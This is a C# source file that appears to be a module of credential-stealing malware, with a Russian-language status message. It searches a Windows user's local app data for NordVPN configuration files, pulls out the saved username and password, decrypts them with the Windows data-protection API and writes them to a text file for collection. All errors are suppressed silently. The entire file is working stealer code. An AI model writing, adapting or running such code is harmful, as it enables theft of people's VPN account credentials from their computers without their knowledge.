using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

internal class NordVPN
{
	public static void Start()
	{
		try
		{
			string text = "";
			string text2 = $"{Buffer.path_l}NordVPN";
			if (!Directory.Exists(text2))
			{
				Directory.CreateDirectory(text2);
			}
			DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Buffer.path_lad, "NordVPN"));
			if (directoryInfo.Exists)
			{
				DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
				for (int i = 0; i < directories.Length; i++)
				{
					DirectoryInfo[] directories2 = directories[i].GetDirectories();
					for (int j = 0; j < directories2.Length; j++)
					{
						string text3 = Path.Combine(directories2[j].FullName, "user.config");
						if (File.Exists(text3))
						{
							XmlDocument xmlDocument = new XmlDocument();
							xmlDocument.Load(text3);
							string innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
							string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
							innerText = ((!string.IsNullOrEmpty(innerText)) ? Decrypt(innerText) : null);
							innerText2 = ((!string.IsNullOrEmpty(innerText2)) ? Decrypt(innerText2) : null);
							if (!string.IsNullOrEmpty(innerText) && !string.IsNullOrEmpty(innerText2))
							{
								text += "=====================================\n";
								text = text + "Login: " + innerText + "\n";
								text = text + "Password: " + innerText2 + "\n";
								text += "=====================================\n\n\n";
							}
						}
					}
				}
				if (!string.IsNullOrEmpty(text.Trim()))
				{
					File.WriteAllText("{path}\\NordVPN.txt", text.Trim().Replace("\n", Environment.NewLine));
				}
			}
			else
			{
				File.WriteAllText($"{text2}\\info.txt", $"{Buffer.head}NordVPN не найден на компьютере.");
			}
		}
		catch
		{
		}
	}

	protected static string Decrypt(string str)
	{
		try
		{
			return Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(str), null, DataProtectionScope.LocalMachine));
		}
		catch
		{
			return null;
		}
	}
}
